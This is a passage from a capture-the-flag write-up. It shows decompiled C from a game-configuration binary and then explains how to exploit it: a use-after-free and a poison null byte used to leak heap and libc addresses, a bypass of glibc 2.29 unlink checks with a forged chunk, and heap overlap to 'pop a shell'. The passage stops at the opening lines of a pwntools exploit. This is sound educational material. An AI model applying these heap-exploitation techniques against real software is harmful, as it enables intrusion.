*)(__dest + 0x28) = uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (*(int *)(__dest + 0x28) != 0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\" [ Description\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; sVar5 = read(0,local_428,0x200);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; readin(local_428);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if (*(uint *)(__dest + 0x28) \u0026lt;= (uint)sVar5) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; local_428[(ulong)*(uint *)(__dest + 0x28)] = 0;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; pvVar4 = malloc((ulong)*(uint *)(__dest + 0x28));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; *(void **)(__dest + 0x30) = pvVar4; \/\/another allocation\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; lVar1 = *(long *)(__dest + 0x30);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; local_448 = 0;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; while( true ) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; sVar6 = strlen(local_428); \/\/counts all the way till null byte\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \/\/what happenned above allows for poison null byte, it's copying strlen bytes rather than desc size bytes\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; if (sVar6 \u0026lt; (ulong)(long)local_448) break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; *(char *)((long)local_448 + lVar1) = local_428[(long)local_448];\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; local_448 = local_448 + 1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; return;\u003C\/div\u003E\u003Cdiv\u003E}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Evoid delete(void)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long lVar1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; void *__ptr;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uint uVar2;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; lVar1 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; puts(\"==Delete Game Configuration\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; puts(\" \u0026gt;\u0026gt;\u0026gt; Run the list option to see available configurations.\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar2 = readnum(\" [ Config Index\u0026nbsp; \u0026nbsp; ]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if ((uVar2 \u0026lt; 0xf) \u0026amp;\u0026amp; (*(long *)(\u0026amp;DAT_00603060 + (ulong)uVar2 * 8) != 0)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __ptr = *(void **)(\u0026amp;DAT_00603060 + (ulong)uVar2 * 8);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if (*(long *)((long)__ptr + 0x30) != 0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; free(*(void **)((long)__ptr + 0x30));\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(__ptr);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; *(undefined8 *)(\u0026amp;DAT_00603060 + (ulong)uVar2 * 8) = 0;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; else {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; puts(\"\u0026nbsp; [!] Invalid index.\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; return;\u003C\/div\u003E\u003Cdiv\u003E}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Evoid readin(char *pcParm1)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long lVar1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char *pcVar2;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; lVar1 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; pcVar2 = strchr(pcParm1,0xd);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (pcVar2 != (char *)0x0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; *pcVar2 = 0;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; pcVar2 = strchr(pcParm1,10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (pcVar2 != (char *)0x0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; *pcVar2 = 0;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; return;\u003C\/div\u003E\u003Cdiv\u003E}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Eulong readnum(char *pcParm1)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; ulong uVar1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char local_28 [24];\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long local_10;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; local_10 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; printf(pcParm1);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; fgets(local_28,0x10,stdin);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar1 = strtol(local_28,(char **)0x0,10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; return uVar1 \u0026amp; 0xffffffff;\u003C\/div\u003E\u003Cdiv\u003E}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Evoid show(void)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long lVar1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long lVar2;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uint uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; lVar1 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; puts(\"==Read Game Configuration\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; puts(\" \u0026gt;\u0026gt;\u0026gt; Run the list option to see available configurations.\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Config Index\u0026nbsp; \u0026nbsp; ]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if ((uVar3 \u0026lt; 0xf) \u0026amp;\u0026amp; (*(long *)(\u0026amp;DAT_00603060 + (ulong)uVar3 * 8) != 0)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; lVar2 = *(long *)(\u0026amp;DAT_00603060 + (ulong)uVar3 * 8);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Game\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ]: %s\\n\",lVar2);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Contrast\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ]: %u\\n\",(ulong)*(uint *)(lVar2 + 0x14));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Gamma\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: %u\\n\",(ulong)*(uint *)(lVar2 + 0x18));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Resolution X-Axis\u0026nbsp; \u0026nbsp;]: %u\\n\",(ulong)*(uint *)(lVar2 + 0x1c));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Resolution Y-Axis\u0026nbsp; \u0026nbsp;]: %u\\n\",(ulong)*(uint *)(lVar2 + 0x20));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Controller\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ]: %u\\n\",(ulong)*(uint *)(lVar2 + 0x24));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if (*(long *)(lVar2 + 0x30) != 0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; printf(\"\u0026nbsp; [ Description\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: %s\\n\",*(undefined8 *)(lVar2 + 0x30));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; else {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; puts(\"\u0026nbsp; [!] Invalid index.\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; return;\u003C\/div\u003E\u003Cdiv\u003E}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Evoid list(void)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long lVar1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uint local_1c;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; lVar1 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; puts(\"==List of Configurations\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; local_1c = 0;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; while (local_1c \u0026lt; 0xf) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if (*(long *)(\u0026amp;DAT_00603060 + (ulong)local_1c * 8) != 0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; printf(\" [%02u] : %s\\n\",(ulong)local_1c,*(undefined8 *)(\u0026amp;DAT_00603060 + (ulong)local_1c *8));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; local_1c = local_1c + 1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; return;\u003C\/div\u003E\u003Cdiv\u003E}\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Evoid main(void)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char local_28 [24];\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long local_10;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; local_10 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; printf(\"protobs@player2:~$ \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; fgets(local_28,0x10,stdin);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; switch(local_28[0]) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; case '0':\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; help();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; case '1':\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; list();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; case '2':\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; create();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; case '3':\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; show();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; case '4':\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; delete();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; case '5':\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; FUN_00400be7();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; break;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; default:\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; puts(\"[!] Invalid option. Enter \\'0\\' for available options.\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; return;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \/* WARNING: Subroutine does not return *\/\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; __stack_chk_fail();\u003C\/div\u003E\u003Cdiv\u003E}\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003C\/div\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv\u003EBasically, there are two bugs, a poison null byte and a UAF.\u0026nbsp; UAF comes from the fact that the game struct, which belongs to the 0x40 tcache bin due to 0x38 allocations, does not zero out the pointer to description when freed.\u0026nbsp; Therefore, we can make a game with a description, free it, get the same game chunk back with another allocation, and get the same description by just setting the size as 0 as the pointer will remain the same.\u0026nbsp; And in the alloc function, there is also a poison null byte due to the way it read in our description from how it indexes to attach the null byte (note the bug there).\u0026nbsp; Using the UAF, we can grab both a heap and libc leak.\u0026nbsp; Heap leak can be grabbed from tcache bin pointers.\u0026nbsp; Libc leak can be grabbed from unsorted bin pointers, which can easily be done since there is no limit to how big we allocate, so we can just allocate some bins in the largebin size area to fall into unsorted bin.\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EAs for the poison null byte, it's a similar concept as older poison null bytes.\u0026nbsp; Only difference is that in libc 2.29, there is the following check:\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if (!prev_inuse(p)) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; prevsize = prev_size (p);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; size += prevsize;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; p = chunk_at_offset(p, -((long) prevsize));\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; if (__glibc_unlikely (chunksize(p) != prevsize))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; unlink_chunk (av, p);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; }\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003C\/div\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EBypassing this isn't too hard.\u0026nbsp; Just forge a fake chunk right above the region you want to coalesce with the correct size (remember the prev_size issue too in poison null bytes; that prev_size determines where it is going to check and how much it will coalesce by!).\u0026nbsp; However, you will also need some heap pointers to point back to the location of the forged chunk to bypass a more classic heap fd-\u0026gt;bk =P and bk-\u0026gt;fd =P unlink macro check.\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EBelow is the unlink macro:\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E\u003Cdiv\u003E#define unlink(AV, P, BK, FD) {\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp;if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))\u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp;malloc_printerr (\"corrupted size vs. prev_size\");\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp;FD = P-\u0026gt;fd;\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp;BK = P-\u0026gt;bk;\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp;if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0))\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp;malloc_printerr (\"corrupted double-linked list\");\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp;else {\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;FD-\u0026gt;bk = BK;\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \\\u003C\/div\u003E\u003Cdiv\u003EBK-\u0026gt;fd = FD;\u0026nbsp;\u003C\/div\u003E\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv\u003ESomehow I missed the really obvious massive heap overflow above from the buffer issue, as sampriti, R4J, and hevr pointed out.\u0026nbsp; Notice how the buffer for the name and the desc are on the same place on the stack, but the fgets for the name allows for a lot more space on the buffer (0x400) while the read for the heap is capped at 0x200.\u0026nbsp; We can simply fill the amount of the heap buffer all the way and also do something similar for name originally... copying using strlen will copy everything over, allowing for a massive heap overflow, and doing the rest of the classic heap stuff with tcache to probably get arbitrary write.\u0026nbsp; This method of exploitation would have been much simpler.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EAnyways, afterwards, you should be able to coalesce, get heap overlap, and pop a shell.\u0026nbsp; Now let's write the exploit.\u0026nbsp; Make sure to debug along if you were not able to solve this!\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EFirst thing I do is write all the helper functions.\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E\u003Cdiv\u003Efrom pwn import *\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E#context.log_level = 'debug'\u003C\/div\u003E\u003Cdiv\u003E#no pie\u003C\/div\u003E\u003Cdiv\u003Ebin = ELF('.\/Protobs')\u003C\/div\u003E\u003Cdiv\u003Elibc = ELF('.\/libc.so.6')\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr 